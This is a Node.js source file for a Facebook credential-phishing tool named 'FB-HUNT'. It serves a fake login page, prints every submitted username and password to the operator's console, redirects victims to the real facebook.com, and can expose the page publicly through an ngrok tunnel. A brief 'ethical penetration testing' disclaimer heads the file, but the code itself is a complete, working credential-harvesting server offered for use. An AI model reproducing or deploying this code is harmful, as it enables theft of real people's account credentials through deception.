const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const readline = require('readline');
const ngrok = require('ngrok');
const fs = require('fs');
require('dotenv').config();

const app = express();
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// Custom ASCII Banner
console.log(`
 \x1b[91m  
 /$$$$$$$$ /$$$$$$$          /$$   /$$ /$$   /$$ /$$   /$$ /$$$$$$$$
| $$_____/| $$__  $$        | $$  | $$| $$  | $$| $$$ | $$|__  $$__/
| $$      | $$  \ $$        | $$  | $$| $$  | $$| $$$$| $$   | $$   
| $$$$$   | $$$$$$$  /$$$$$$| $$$$$$$$| $$  | $$| $$ $$ $$   | $$   
| $$__/   | $$__  $$|______/| $$__  $$| $$  | $$| $$  $$$$   | $$   
| $$      | $$  \ $$        | $$  | $$| $$  | $$| $$\  $$$   | $$   
| $$      | $$$$$$$/        | $$  | $$|  $$$$$$/| $$ \  $$   | $$   
|__/      |_______/         |__/  |__/ \______/ |__/  \__/   |__/   


=================================================================================
  

  Disclaimer: 

This tool is developed strictly for educational and ethical penetration 
testing purposes only. Unauthorized use of this tool to access, damage, 
disrupt, or interfere with any systems or networks that you do not own or 
have explicit permission to test is illegal and strictly prohibited.

The developer(s) of this tool will not be held responsible for any misuse,
damage, legal consequences, or losses resulting from the use of this software.
By using this tool, you agree to take full responsibility for your actions and
ensure that your use complies with all local, national, and international laws.

Use responsibly. Hack the right way.

=================================================================================
\x1b[0m

             Ready to capture credentials - Owner Taffy Creations
             ----------------------------------------------------
`);

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  const timestamp = new Date().toLocaleString();
  console.log('\n--- Login Attempt ---');
  console.log(`Time: ${timestamp}`);
  console.log(`Username: ${username}`);
  console.log(`Password: ${password}`);
  console.log('--------------------\n');
  
  res.redirect('https://www.facebook.com');
});

// Server Functions
async function startWithNgrok() {
  if (!process.env.NGROK_AUTH_TOKEN) {
    console.log('\nNgrok API key not found in .env file');
    await promptForNgrokToken();
  } else {
    await startServerWithNgrok(process.env.NGROK_AUTH_TOKEN);
  }
}

async function promptForNgrokToken() {
  return new Promise((resolve) => {
    const ask = () => {
      rl.question('Enter Ngrok API key On .ENV File', async (input) => {
        if (input.toLowerCase() === 'exit') {
          console.log('Exiting...');
          process.exit(0);
        }

        if (!validateNgrokToken(input)) {
          console.log('\n⚠️  Invalid format. Ngrok tokens are 32+ alphanumeric characters.');
          ask();
          return;
        }

        try {
          fs.writeFileSync('.env', `NGROK_AUTH_TOKEN=${input}`);
          console.log('✅ API key saved to .env');
          delete require.cache[require.resolve('dotenv')];
          require('dotenv').config();
          await startServerWithNgrok(input);
          resolve();
        } catch (err) {
          console.error('❌ Error saving key:', err);
          ask();
        }
      });
    };
    ask();
  });
}

function validateNgrokToken(token) {
  return token && token.length >= 32 && /^[a-zA-Z0-9_]+$/.test(token);
}

async function startServerWithNgrok(authToken) {
  return new Promise(async (resolve) => {
    const server = app.listen(3000, async () => {
      console.log(`\nLocal server running on http://localhost:3000`);
      
      try {
        const url = await ngrok.connect({
          addr: 3000,
          authtoken: authToken,
          region: 'us'
        });
        
        console.log(`Public Ngrok URL: ${url}`);
        console.log('Waiting for login attempts...\n');
        resolve();
      } catch (err) {
        console.error('❌ Ngrok connection failed:', err.message);
        if (err.message.includes('connection refused')) {
          console.log('Ensure your local server is running on port 3000');
        }
        server.close();
        process.exit(1);
      }
    });

    process.on('SIGINT', () => {
      console.log('\nShutting down gracefully...');
      server.close();
      ngrok.disconnect();
      ngrok.kill();
      process.exit();
    });
  });
}

function startLocal() {
  const server = app.listen(3000, () => {
    console.log(`\nServer running on http://localhost:3000`);
    console.log('Waiting for login attempts...\n');
  });

  process.on('SIGINT', () => {
    console.log('\nShutting down...');
    server.close();
    process.exit();
  });
}

// Main Execution
(async () => {
  try {
    const answer = await new Promise((resolve) => {
      rl.question('Choose mode:\n1. Localhost\n2. Ngrok\nSelection (1/2): ', resolve);
    });

    if (answer === '1') {
      startLocal();
    } else if (answer === '2') {
      await startWithNgrok();
    } else {
      console.log('Invalid choice. Exiting...');
      process.exit(1);
    }
  } catch (err) {
    console.error('Startup error:', err);
    process.exit(1);
  } finally {
    rl.close();
  }
})();